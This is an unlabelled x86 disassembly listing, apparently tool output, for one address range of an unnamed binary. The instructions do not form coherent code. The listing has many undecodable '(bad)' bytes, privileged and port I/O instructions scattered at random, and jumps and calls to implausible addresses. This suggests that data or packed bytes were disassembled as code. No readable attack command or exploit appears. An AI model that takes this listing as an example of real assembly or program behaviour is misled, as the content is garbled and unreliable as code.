  419058:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  41905f:	jb     0x419021
  419061:	jmp    0x41904e
  419063:	xor    esi,DWORD PTR [ebx]
  419065:	pop    edi
  419066:	pop    esi
  419067:	pop    ebx
  419068:	ret    
  419069:	ret    0x8b
  41906c:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  419072:	xor    DWORD PTR [ecx],0xc
  419075:	pushf  
  419076:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  41907c:	wrmsr  
  41907e:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  419085:	dec    ebp
  419086:	ret    
  419087:	mov    edi,DWORD PTR [esi-0x4]
  41908a:	pop    eax
  41908b:	dec    ebp
  41908c:	jne    0x419019
  41908e:	xor    edi,esp
  419090:	inc    eax
  419091:	dec    ebp
  419092:	jbe    0x4190e7
  419094:	inc    eax
  419095:	pop    ebp
  419096:	add    edx,DWORD PTR [esi+0x8]
  419099:	push   ebp
  41909a:	dec    eax
  41909b:	push   ecx
  41909c:	mov    eax,edi
  41909e:	and    al,0xf0
  4190a0:	jo     0x41908d
  4190a2:	mov    eax,DWORD PTR [ebx]
  4190a4:	sbb    BYTE PTR [ebp+0x4d],cl
  4190a7:	mov    eax,DWORD PTR [ebx]
  4190a9:	nop
  4190aa:	or     BYTE PTR [eax],al
  4190ac:	jne    0x419105
  4190ae:	cmp    ebx,DWORD PTR [edi+esi*2-0x3cc76ce]
  4190b5:	xor    edi,edi
  4190b7:	add    edi,DWORD PTR [ebp+0x3]
  4190ba:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  4190c0:	js     0x419046
  4190c2:	jae    0x4190c6
  4190c4:	(bad)  
  4190c6:	xor    al,0x5d
  4190c8:	jmp    0x419055
  4190ca:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  4190d1:	fdecstp 
  4190d3:	test   BYTE PTR [edi],ah
  4190d5:	add    bh,BYTE PTR [ebp+0x0]
  4190d8:	add    ebx,DWORD PTR [ebp-0x77]
  4190db:	mov    edi,eax
  4190dd:	cmp    al,0x0
  4190e0:	adc    dh,BYTE PTR [ebx]
  4190e2:	jge    0x4190e7
  4190e4:	mov    edi,DWORD PTR [ebx]
  4190e6:	jl     0x4190f7
  4190e8:	clc    
  4190e9:	dec    edi
  4190ea:	jge    0x4190ec
  4190ec:	mov    eax,DWORD PTR [ebx]
  4190ee:	jb     0x4190f8
  4190f0:	mov    ecx,DWORD PTR [ebp-0x8]
  4190f3:	mov    edi,edi
  4190f5:	xor    edx,DWORD PTR [eax]
  4190f7:	add    edi,DWORD PTR [ebx]
  4190f9:	mov    DWORD PTR [ebp-0x10],edi
  4190fc:	inc    edi
  4190fd:	pop    ebp
  4190fe:	jge    0x41913b
  419100:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  419104:	mov    edx,0xc05d87f0
  419109:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  41910d:	fimul  WORD PTR [eax]
  41910f:	fist   WORD PTR [ebp+0x1c]
  419112:	in     al,dx
  419113:	jne    0x419101
  419115:	mov    edi,DWORD PTR [edx-0x7a27a10]
  41911b:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  41911f:	fdivp  st(0),st
  419121:	fild   WORD PTR [ebp+0x4510f85c]
  419127:	test   BYTE PTR [ebx+0x4d00fc02],cl
  41912d:	inc    ebp
  41912e:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  419134:	mov    ebp,DWORD PTR [ebx-0x4]
  419137:	adc    al,0x8b
  419139:	rcl    DWORD PTR [eax],0x48
  41913c:	mov    esi,0x7080803
  419141:	fiadd  WORD PTR [ebp+0x4d]
  419144:	(bad)  
  419145:	mov    edx,DWORD PTR [edx-0x4]
  419148:	mov    edx,DWORD PTR [ebp-0x4]
  41914b:	xor    ebx,DWORD PTR [ebx+0x330103]
  419151:	mov    DWORD PTR [edi+0x872dc],edi
  419157:	xlat   BYTE PTR ds:[ebx]
  419158:	into   
  419159:	ffreep st(6)
  41915b:	retf   0x6c7
  41915e:	iret   
  41915f:	dec    ebp
  419160:	inc    ebp
  419161:	mov    DWORD PTR [ebx],edi
  419163:	fmul   QWORD PTR [edi]
  419165:	dec    ebp
  419166:	jnp    0x41919b
  419168:	add    BYTE PTR [ebx],al
  41916a:	mov    ecx,DWORD PTR [esp+edi*8]
  41916d:	inc    ebp
  41916e:	dec    ebp
  41916f:	lea    esi,[ebx]
  419171:	add    DWORD PTR [ebx],eax
  419173:	jb     0x4191b0
  419175:	add    BYTE PTR [edi],cl
  419177:	inc    ebp
  419178:	imul   eax,edi,0x858bd800
  41917e:	cld    
  41917f:	clc    
  419180:	mov    DWORD PTR [ebp+0x0],eax
  419183:	inc    DWORD PTR [eax]
  419185:	or     al,0xde
  419187:	sbb    bh,0x1
  41918a:	retf   
  41918b:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  419192:	dec    ebp
  419193:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  419199:	enter  0x12de,0xdf
  41919d:	inc    ebp
  41919e:	pop    ebp
  41919f:	dec    DWORD PTR [ebx-0x257f0ff4]
  4191a5:	add    DWORD PTR [edx],edx
  4191a7:	add    BYTE PTR [ebp+0x50],dl
  4191aa:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  4191b0:	xor    ecx,DWORD PTR [eax-0x38c699fd]
  4191b6:	or     ah,al
  4191b8:	pop    ss
  4191b9:	cdq    
  4191ba:	push   ebp
  4191bb:	clc    
  4191bc:	mov    eax,DWORD PTR [ebp-0x4]
  4191bf:	xor    edx,edx
  4191c1:	add    esi,DWORD PTR [ebx]
  4191c3:	cmp    eax,DWORD PTR [ebx]
  4191c5:	hlt    
  4191c6:	cmp    DWORD PTR [ebx],esp
  4191c8:	or     al,BYTE PTR [ebp+0xf]
  4191cb:	mov    eax,DWORD PTR [edx]
  4191cd:	loopne 0x4191cf
  4191cf:	(bad)  
  4191d0:	mov    ecx,esi
  4191d2:	cld    
  4191d3:	pushf  
  4191d4:	pop    ebp
  4191d5:	pushf  
  4191d6:	mov    esi,DWORD PTR [edx]
  4191d8:	lock mov eax,eax
  4191db:	adc    BYTE PTR [ebx],al
  4191dd:	or     BYTE PTR [ebx+0x4d001001],0xcf
  4191e4:	xor    ebp,DWORD PTR [edi+0x50e45189]
  4191ea:	dec    ebp
  4191eb:	mov    ecx,DWORD PTR [ebx-0x31390304]
  4191f1:	(bad)  
  4191f2:	iret   
  4191f3:	inc    ebp
  4191f4:	(bad)  
  4191f5:	jne    0x419244
  4191f7:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  4191fd:	(bad)  
  4191fe:	cmp    ebx,eax
  419200:	je     0x419188
  419202:	add    edi,edi
  419204:	or     bh,bh
  419206:	dec    ebp
  419207:	inc    ebp
  419208:	mov    esi,DWORD PTR [ebx]
  41920a:	cld    
  41920b:	add    ecx,esi
  41920d:	cmp    ecx,DWORD PTR [eax-0xc]
  419210:	mov    edx,DWORD PTR [edi]
  419212:	or     BYTE PTR [ebp-0x7c],al
  419215:	mov    ebx,DWORD PTR [eax+ebp*8-0x7b7639ce]
  41921c:	or     al,0x9c
  41921e:	inc    ebp
  41921f:	xor    bh,BYTE PTR [ecx+ecx*4]
  419222:	pushf  
  419223:	call   0x5281b3
  419228:	jne    0x4191f1
  41922a:	mov    ebp,esp
  41922c:	fcomp  DWORD PTR [ebx]
  41922e:	add    BYTE PTR [ecx],al
  419230:	inc    DWORD PTR [ebp-0x75]
  419233:	(bad)  
  419234:	cld    
  419235:	add    al,0xce
  419237:	mov    ecx,edi
  419239:	cld    
  41923a:	inc    ebp
  41923b:	fidivr WORD PTR [ebx]
  41923d:	fbstp  TBYTE PTR [ebp-0x3e]
  419240:	mov    eax,DWORD PTR [eax]
  419242:	adc    BYTE PTR [ebx-0x3974038b],cl
  419248:	fadd   st,st(7)
  41924a:	add    BYTE PTR [ebp-0x1],al
  41924d:	mov    ecx,DWORD PTR [esp+edi*8]
  419250:	inc    ebp
  419251:	mov    bh,0xc7
  419254:	loopne 0x41929b
  419256:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  41925c:	sbb    BYTE PTR [ebx],dh
  41925e:	pushf  
  41925f:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  419265:	mov    eax,edi
  419267:	cwde   
  419268:	inc    ebp
  419269:	inc    ebp
  41926a:	jne    0x4191f7
  41926c:	mov    esp,esp
  41926e:	clc    
  41926f:	add    al,0x4d
  419271:	mov    DWORD PTR [ebx],esi
  419273:	or     al,0x33
  419275:	inc    ebp
  419276:	lea    ecx,[ebx-0x398d13fd]
  41927c:	add    bh,al
  41927e:	inc    ebp
  41927f:	ror    DWORD PTR [ebx+0x45d829],0x8b
  419286:	add    ebp,esp
  419288:	shufps xmm1,xmm3,0xc7
  41928c:	(bad)  
  41928d:	jmp    0x7486cdb6
  419292:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  419298:	hlt    
  419299:	mov    ecx,DWORD PTR [edi]
  41929b:	fadd   DWORD PTR [ebp+0x0]
  41929e:	xor    ecx,DWORD PTR [edi]
  4192a0:	add    ecx,ecx
  4192a2:	cmp    edi,edi
  4192a4:	pmuludq mm7,QWORD PTR [edx+0x50]
  4192a8:	(bad)  
  4192a9:	jmp    0x419236
  4192ab:	mov    edi,esp
  4192ad:	or     al,0xc6
  4192af:	inc    ebp
  4192b0:	(bad)  
  4192b1:	mov    eax,DWORD PTR [ebp+0x10]
  4192b4:	jne    0x41923f
  4192b6:	mov    eax,DWORD PTR [ecx]
  4192b8:	clc    
  4192b9:	add    BYTE PTR [ebp-0x40],cl
  4192bc:	xor    edx,DWORD PTR [eax-0x73]
  4192bf:	jne    0x4192c2
  4192c1:	push   DWORD PTR [edx+0x8]
  4192c4:	add    BYTE PTR [ebp+0x45],al
  4192c7:	mov    ebp,ecx
  4192c9:	cld    
  4192ca:	add    BYTE PTR [ebp+0x0],cl
  4192cd:	xor    eax,DWORD PTR [ebp+0x3]
  4192d0:	mov    DWORD PTR [ebx],edi
  4192d2:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  4192d8:	sub    eax,0x5d330e4d
  4192dd:	lea    esi,[ebx]
  4192df:	add    DWORD PTR [ebx],eax
  4192e1:	jb     0x4192cc
  4192e3:	add    BYTE PTR [eax],al
  4192e5:	inc    ebp
  4192e6:	add    bl,ch
  4192e8:	inc    ebp
  4192e9:	mov    esi,DWORD PTR [ebx]
  4192eb:	or     al,0x3
  4192ed:	(bad)  
  4192ee:	mov    edi,eax
  4192f0:	in     al,dx
  4192f1:	scas   eax,DWORD PTR es:[edi]
  4192f2:	inc    ebp
  4192f3:	mov    esi,DWORD PTR [ebx]
  4192f5:	in     al,0x3
  4192f7:	add    al,0x89
  4192f9:	mov    ecx,DWORD PTR [eax+edi*8]
  4192fc:	dec    ebp
  4192fd:	(bad)  
  4192fe:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3164]
  419305:	mov    ecx,eax
  419307:	cld    
  419308:	push   es
  419309:	dec    ebp
  41930a:	add    al,0x33
  41930c:	mov    DWORD PTR [ebx],eax
  41930e:	in     al,dx
  41930f:	cmp    DWORD PTR [ebp-0x67],eax
  419312:	mov    eax,DWORD PTR [ebp-0xba0068]
  419318:	mov    edx,DWORD PTR [ebp-0x4]
  41931b:	mov    ecx,DWORD PTR [ebp-0x18]
  41931e:	xor    ecx,DWORD PTR [ebp+0x3]
  419321:	cmp    DWORD PTR [ebx],0x8b32749b
  419327:	xor    edi,esp
  419329:	jmp    0xff75907b
  41932e:	add    ecx,DWORD PTR [ebp-0x3f]
  419331:	xor    ebx,DWORD PTR [edi]
  419333:	add    eax,ecx
  419335:	cmp    ebx,DWORD PTR [eax]
  419337:	mov    ecx,DWORD PTR [ebp-0x4]
  41933a:	mov    ecx,DWORD PTR [eax]
  41933c:	adc    BYTE PTR [ebp-0x80],al
  41933f:	jmp    0x419342
  419341:	mov    eax,DWORD PTR [eax]
  419343:	cld    
  419344:	mov    bh,0xc6
  419346:	push   ecx
  419347:	(bad)  
  419348:	jne    0x4193a8
  41934a:	dec    ecx
  41934c:	or     BYTE PTR [ecx+ebx*1],cl
  41934f:	push   ebp
  419350:	inc    ebp
  419351:	in     al,dx
  419352:	add    ebp,esp
  419354:	or     bh,al
  419356:	dec    ebp
  419357:	cld    
  419358:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  41935e:	xor    DWORD PTR [eax],0x2
  419361:	pushf  
  419362:	dec    DWORD PTR [ebx+0x45510cf4]
  419368:	mov    DWORD PTR [ebx+0x5545fc0c],ecx
  41936e:	mov    edx,DWORD PTR [ecx+0xc]
  419371:	xor    eax,esi
  419373:	mov    edx,0xc172c7
  419378:	inc    ebp
  419379:	mov    esi,DWORD PTR [ebp+0x8]
  41937c:	mov    eax,edx
  41937e:	call   0x84c65a73
  419383:	add    DWORD PTR [eax+eax*1-0x7476bace],ebx
  41938a:	call   0x4db1a397
  41938f:	push   edi
  419390:	xor    esi,DWORD PTR [ebp+0x3]
  419393:	(bad)  
  419394:	pmulhuw mm0,mm1
  419397:	test   DWORD PTR [ebp-0x8],ecx
  41939a:	mov    DWORD PTR [ebp-0x67],eax
  41939d:	mov    eax,DWORD PTR [ebp-0x4]
  4193a0:	xor    edi,DWORD PTR [ebp-0x73]
  4193a3:	xor    eax,DWORD PTR [ebx]
  4193a5:	xor    esi,DWORD PTR [edx+0x3]
  4193a8:	add    BYTE PTR [ecx],bh
  4193aa:	inc    ebp
  4193ab:	(bad)  
  4193ac:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  4193b2:	mov    DWORD PTR [eax],0x750f0004
  4193b8:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  4193be:	lock add BYTE PTR [ebp+0x0],al
  4193c2:	mov    esi,DWORD PTR [ebp-0x2c]
  4193c5:	mov    ebp,edx
  4193c7:	or     al,0x72
  4193c9:	ja     0x4193cb
  4193cb:	mov    edx,esi
  4193cd:	cld    
  4193ce:	(bad)  
  4193d1:	cli    
  4193d2:	mov    esi,DWORD PTR [ebp-0x4]
  4193d5:	cmp    ecx,esi
  4193d7:	bswap  edi
  4193d9:	(bad)
  4193dd:	mov    esi,DWORD PTR [ebp-0x4]
  4193e0:	mov    esi,ecx
  4193e2:	clc    
  4193e3:	repnz add esi,DWORD PTR [ebp+0x45]
  4193e7:	push   ebx
  4193e8:	xor    eax,DWORD PTR [ebp+0x3]
  4193eb:	xor    bl,BYTE PTR [edi-0x64]
  4193ee:	pop    ebx
  4193ef:	jmp    0x4194b6
  4193f4:	mov    esi,DWORD PTR [ebp-0x7d]
  4193f7:	xor    ebp,DWORD PTR [eax]
  4193f9:	lea    eax,[ebp-0x8]
  4193fc:	xor    edx,esi
  4193fe:	pushf  
  4193ff:	out    dx,eax
  419400:	(bad)  
  419401:	neg    eax
  419403:	ins    DWORD PTR es:[edi],dx
  419404:	test   esi,edi
  419406:	clc    
  419407:	pop    esp
  419408:	inc    ebp
  419409:	or     BYTE PTR [ecx+0x450f0c7d],cl
  41940f:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  419415:	add    cl,al
  419417:	jne    0x4193b5
  419419:	mov    esi,DWORD PTR [edx]
  41941b:	in     al,dx
  41941c:	push   esi
  41941d:	xor    BYTE PTR [ebp-0xe],dh
  419420:	add    edi,esi
  419422:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  419428:	add    cl,bh
  41942a:	mov    edi,DWORD PTR [ebp+0x8]
  41942d:	mov    DWORD PTR [ebp-0x14],esi
  419430:	add    esi,DWORD PTR [ebp+0x3c]
  419433:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  419439:	mov    ah,0x3c
  41943b:	pushf  
  41943c:	pushf  
  41943d:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  419443:	jne    0x4193d0
  419445:	mov    ecx,DWORD PTR [esp+ebp*8]
  419448:	icebp  
  419449:	icebp  
  41944a:	shl    edx,0xf2
  41944d:	(bad)  
  41944e:	mov    ah,0x16
  419450:	pop    eax
  419451:	jne    0x4193e6
  419453:	mov    ecx,DWORD PTR [edi]
  419455:	in     al,dx
  419456:	jmp    0x419449
  419458:	add    dl,dh
  41945a:	mov    edi,esi
  41945c:	or     al,0x8
  41945e:	inc    ebp
  41945f:	jne    0x419464
  419461:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  419467:	ret    
  419468:	or     bh,bh
  41946a:	jge    0x419454
  41946c:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  419472:	xor    edi,eax
  419474:	add    esi,DWORD PTR [ebp-0x77]
  419477:	mov    ebx,esp
  419479:	clc    
  41947a:	neg    DWORD PTR [ebp-0x7c]
  41947d:	xor    eax,DWORD PTR [eax]
  41947f:	cmp    eax,DWORD PTR [eax]
  419481:	repz jne 0x419419
  419484:	xor    eax,DWORD PTR [ecx]
  419486:	add    ebx,DWORD PTR [eax]
  419488:	mov    DWORD PTR [ebp-0x8],eax
  41948b:	mov    eax,edi
  41948d:	cld    
  41948e:	lock pop eax
  419490:	test   DWORD PTR [ebx],esi
  419492:	clc    
  419493:	add    edx,DWORD PTR [edi-0x740bff77]
  419499:	fdivp  st(4),st
  41949b:	test   ecx,esi
  41949d:	(bad)  
  41949e:	jnp    0x41949f
  4194a0:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  4194a6:	jae    0x419433
  4194a8:	sub    edi,esp
  4194aa:	(bad)  
  4194ab:	shl    DWORD PTR [eax-0x3e],0x89
  4194af:	leave  
  4194b0:	call   0x81974bbd
  4194b5:	in     al,dx
  4194b6:	(bad)  
  4194b7:	in     al,dx
  4194b8:	add    bh,al
  4194ba:	mov    esp,edi
  4194bc:	in     al,dx
  4194bd:	test   DWORD PTR [ebp-0x8],edi
  4194c0:	mov    eax,DWORD PTR [ebp+0x2b]
  4194c3:	xor    BYTE PTR [ebx],al
  4194c5:	pushf  
  4194c6:	jnp    0x573090ff
  4194cc:	xor    edx,DWORD PTR [ebp-0x77]
  4194cf:	push   ecx
  4194d0:	loopne 0x419505
  4194d2:	jne    0x41948f
  4194d4:	mov    esi,DWORD PTR [edx-0x20]
  4194d7:	add    BYTE PTR [ebp-0x3d],bh
  4194da:	xor    eax,DWORD PTR [ebp-0x73]
  4194dd:	mov    edi,DWORD PTR [esi]
  4194df:	cld    
  4194e0:	jb     0x4194a8
  4194e2:	add    bl,al
  4194e4:	jne    0x41952b
  4194e6:	mov    edx,DWORD PTR [edi-0x10]
  4194e9:	jge    0x419568
  4194eb:	mov    esi,DWORD PTR [ebx]
  4194ed:	lock add ecx,DWORD PTR [ebp+0x3b]
  4194f1:	xor    esi,DWORD PTR [ebp-0x77]
  4194f4:	mov    esi,eax
  4194f6:	lock inc ebp
  4194f8:	jge    0x41952b
  4194fa:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  419501:	dec    ebp
  419502:	mov    esi,DWORD PTR [ebx]
  419504:	loopne 0x41948f
  419506:	jge    0x419500
  419508:	add    DWORD PTR [ebp-0x7d],eax
  41950b:	icebp  
  41950c:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  419513:	dec    ebp
  419514:	hlt    
  419515:	xor    ebx,DWORD PTR [ebp-0x77]
  419518:	mov    esi,esp
  41951a:	in     al,0x45
  41951c:	jge    0x41955b
  41951e:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  419525:	dec    ebp
  419526:	pop    esp
  419527:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  41952d:	inc    ebp
  41952e:	hlt    
  41952f:	xor    DWORD PTR [ebp-0x61],esi
  419532:	mov    edi,DWORD PTR [eax+0xf19504]
  419538:	repnz mov DWORD PTR [ebp+0x20],ebx
  41953c:	cmp    eax,DWORD PTR [ebp+0xf]
  41953f:	test   DWORD PTR [edi+ecx*1-0x1],edx
  419543:	fistp  WORD PTR [ebx+0x0]
  419546:	inc    ebp
  419547:	mov    ebx,DWORD PTR [edi+0xc]
  41954a:	add    eax,eax
  41954c:	inc    ebp
  41954d:	test   BYTE PTR [ebx],dh
  41954f:	add    eax,DWORD PTR [ebx]
  419551:	add    BYTE PTR [esi+0x45],bl
  419554:	ret    0x85
  419557:	jnp    0x54421926
  41955d:	inc    bp
  41955f:	inc    ebp
  419560:	xor    DWORD PTR [ecx+0xc78a9c],edi
  419566:	fdiv   QWORD PTR [ebx]
  419568:	test   DWORD PTR [ecx+0x453bf8],edi
  41956e:	push   ebx
  41956f:	add    edi,DWORD PTR [esi+0x708088b]
  419575:	cmp    esi,eax
  419577:	setl   BYTE PTR [ecx-0x74fcffce]
  41957e:	mov    esp,edi
  419580:	call   0x33ccdad2
  419585:	or     BYTE PTR [ebx],al
  419587:	inc    ecx
  419588:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  41958e:	and    BYTE PTR [ebp-0x7074f0bb],al
  419594:	lock add cl,al
  419597:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  41959e:	mov    ch,0x45
  4195a0:	clc    
  4195a1:	xor    eax,DWORD PTR [ebp+0x3]
  4195a4:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  4195aa:	inc    ebp
  4195ab:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  4195b1:	mov    edi,eax
  4195b3:	mov    eax,DWORD PTR [ebp+0x3c]
  4195b6:	mov    ecx,DWORD PTR [eax]
  4195b8:	hlt    
  4195b9:	inc    ebp
  4195ba:	ror    DWORD PTR [ebx+0x818c45],0xf4
  4195c1:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  4195c7:	push   ebp
  4195c8:	mov    edi,DWORD PTR [ebx]
  4195ca:	in     al,dx
  4195cb:	jne    0x41958e
  4195cd:	mov    eax,DWORD PTR [ebp-0x28]
  4195d0:	add    DWORD PTR [eax],0xe8058dec
  4195d6:	clc    
  4195d7:	mov    esi,DWORD PTR [edi-0x8]
  4195da:	add    dh,dl
  4195dc:	rol    WORD PTR [ebp-0x1],cl
  4195e0:	mov    edx,DWORD PTR [eax+0x8]
  4195e3:	jne    0x4195a5
  4195e5:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  4195ec:	inc    ebp
  4195ed:	push   esp
  4195ee:	test   DWORD PTR [ecx+0xf],ecx
  4195f1:	sub    edx,esp
  4195f3:	add    eax,DWORD PTR [eax]
  4195f5:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  4195fb:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  419602:	mov    eax,DWORD PTR [ecx]
  419604:	and    BYTE PTR [eax],al
  419606:	adc    BYTE PTR ds:[eax],al
  419609:	inc    ebp
  41960a:	inc    cx
  41960d:	push   esp
  41960e:	add    al,0x75
  419610:	add    BYTE PTR [edx+0x66],dl
  419613:	enter  0xc1,0x4d
  419617:	mov    esp,DWORD PTR [esi+0x20]
  41961a:	add    DWORD PTR [ecx-0x7b],eax
  41961d:	add    eax,DWORD PTR [ebx]
  41961f:	str    WORD PTR [eax+0x45]
  419623:	lea    ecx,[ebx+0x45890801]
  419629:	sbb    BYTE PTR [ebx],al
  41962b:	dec    ebp
  41962c:	cmp    al,0xf
  41962e:	inc    ebp
  41962f:	push   eax
  419630:	mov    esi,DWORD PTR [ebx]
  419632:	push   eax
  419633:	add    eax,eax
  419635:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  41963c:	inc    ebp
  41963d:	add    BYTE PTR [ecx],dh
  41963f:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  419646:	(bad)  
  419647:	mov    ebx,eax
  419649:	loopne 0x419690
  41964b:	dec    ebp
  41964c:	mov    ecx,DWORD PTR [edi]
  41964e:	cld    
  41964f:	push   eax
  419650:	xchg   DWORD PTR [ebx],esi
  419652:	add    DWORD PTR [ebx],ebp
  419654:	add    BYTE PTR [ebx],ch
  419656:	or     BYTE PTR [ecx],bh
  419658:	dec    ecx
  419659:	loopne 0x41965e
  41965b:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  419661:	push   ebp
  419662:	add    DWORD PTR [ebx+0x55100800],eax
  419668:	dec    ebp
  419669:	jmp    0x4195f4
  41966b:	mov    esp,DWORD PTR [eax]
  41966d:	sbb    dl,dl
  41966f:	inc    eax
  419670:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  419676:	add    BYTE PTR [ebx+0x74528555],cl
  41967c:	push   ebp
  41967d:	div    DWORD PTR [ebx]
  41967f:	and    eax,DWORD PTR [ebx]
  419681:	add    edx,DWORD PTR [edx-0x30]
  419684:	jno    0x419611
  419686:	inc    DWORD PTR [eax+eiz*1]
  419689:	inc    ebp
  41968a:	push   eax
  41968b:	push   eax
  41968c:	mov    esp,DWORD PTR [edi-0x74beff1c]
  419692:	mov    edi,esp
  419694:	push   eax
  419695:	inc    ebp
  419696:	enter  0x458b,0x8
  41969a:	push   ecx
  41969b:	(bad)  
  41969c:	call   0x10ba074
  4196a1:	pop    ss
  4196a2:	push   ebp
  4196a3:	mov    ecx,DWORD PTR [ebx+0x489408]
  4196a9:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  4196af:	push   ecx
  4196b0:	jo     0x41969a
  4196b2:	inc    DWORD PTR [edi]
  4196b4:	or     BYTE PTR [eax],al
  4196b6:	call   0xcc9e00
  4196bb:	fmul   QWORD PTR [ebp+0x55]
  4196be:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  4196c4:	mov    bh,0x8c
  4196c6:	adc    al,0x9c
  4196c8:	dec    esp
  4196c9:	xor    bl,BYTE PTR [eax]
  4196cb:	mov    ecx,DWORD PTR [ebp+0xc]
  4196ce:	mov    eax,DWORD PTR [ebp-0x4]
  4196d1:	mov    esi,DWORD PTR [edi-0x3148f924]
  4196d7:	push   es
  4196d8:	retf   
  4196d9:	mov    BYTE PTR [ebp-0x30],0x3b
  4196dd:	inc    ebp
  4196de:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  4196e5:	retf   0x83fc
  4196e8:	into   
  4196e9:	dec    ebp
  4196ea:	retf   
  4196eb:	mov    ecx,DWORD PTR [ebp-0x74]
  4196ee:	mov    eax,DWORD PTR [eax]
  4196f0:	fdiv   QWORD PTR [ebx]
  4196f2:	mov    bh,0x3
  4196f4:	push   es
  4196f5:	mov    esi,ecx
  4196f7:	sbb    cl,dl
  4196f9:	dec    ebp
  4196fa:	sar    DWORD PTR [ebx],cl
  4196fc:	push   ebp
  4196fd:	jne    0x41970e
  4196ff:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  419705:	lea    ebx,[eax]
  419707:	call   0xf4cb22ce
  41970c:	sbb    dh,dl
  41970e:	add    edx,ebx
  419710:	push   ebp
  419711:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  419717:	push   ecx
  419718:	mov    DWORD PTR [eax-0x30],edx
  41971b:	test   DWORD PTR [edx],eax
  41971d:	xadd   esp,esi
  419720:	pop    es
  419721:	add    cl,dl
  419723:	mov    eax,ecx
  419725:	or     al,0x45
  419727:	(bad)  
  419728:	push   eax
  419729:	add    DWORD PTR [edx+0x0],eax
  41972c:	add    ecx,DWORD PTR [ecx]
  41972e:	and    dh,cl
  419730:	call   0xc5a000
  419735:	add    DWORD PTR [ebp+0x0],edx
  419738:	mov    esp,DWORD PTR [ebp+0x18]
  41973b:	add    BYTE PTR [eax+0x54],cl
  41973e:	xor    eax,DWORD PTR [eax]
  419740:	add    esp,DWORD PTR [esi+0x3b]
  419743:	inc    ebp
  419744:	je     0x4196c9
  419746:	push   ecx
  419747:	cli    
  419748:	dec    ebp
  419749:	mov    DWORD PTR [ebx],eax
  41974b:	(bad)  
  41974c:	or     al,0x5e
  41974e:	inc    eax
  41974f:	add    BYTE PTR [ebx],al
  419751:	data16 and BYTE PTR [ebp+0x50],al
  419755:	sub    DWORD PTR [ecx],0xfffffff8
  419758:	add    BYTE PTR [ebp-0x75],ah
  41975b:	add    BYTE PTR [eax],bl
  41975d:	enter  0x894d,0x8b
  419761:	int3   
  419762:	loopne 0x419726
  419764:	rol    BYTE PTR [eax],0x33
  419767:	lea    cx,[ebp+0xa]
  41976b:	data16 jb 0x4197b3
  41976e:	add    BYTE PTR [ebx+0x44890855],cl
  419774:	sbb    ah,al
  419776:	inc    ebp
  419777:	lldt   WORD PTR ds:[edx+0x66]
  41977c:	xor    ecx,DWORD PTR [eax]
  41977e:	sub    eax,DWORD PTR [ebx+ecx*4]
  419781:	add    BYTE PTR [esi+eiz*2],cl
  419784:	ror    edx,cl
  419786:	dec    ebp
  419787:	inc    ebp
  419788:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  41978e:	cld    
  41978f:	or     BYTE PTR [edi+0x4501dd],dl
  419795:	(bad)  
  419796:	into   
  419797:	out    dx,al
  419798:	retf   
  419799:	(bad)  
  41979a:	dec    ebp
  41979b:	mov    al,0x8b
  41979d:	loop   0x4197bf
  41979f:	cmp    ecx,DWORD PTR [edx]
  4197a1:	inc    ebp
  4197a2:	daa    
  4197a3:	loop   0x41972c
  4197a5:	out    dx,al
  4197a6:	add    edi,eax
  4197a8:	add    BYTE PTR [eax+0x3f52e155],bh
  4197ae:	push   ebp
  4197af:	inc    ebp
  4197b0:	xor    ebx,esp
  4197b2:	add    ebp,esi
  4197b4:	push   edx
  4197b5:	push   bp
  4197b7:	inc    ebp
  4197b8:	(bad)  
  4197b9:	in     eax,dx
  4197ba:	push   esp
  4197bb:	(bad)  
  4197bc:	inc    edx
  4197be:	sbb    al,0x33
  4197c0:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4197c7:	add    BYTE PTR [ebp+0x47],0x8b
  4197cb:	jmp    0xf98b:0x100041c8
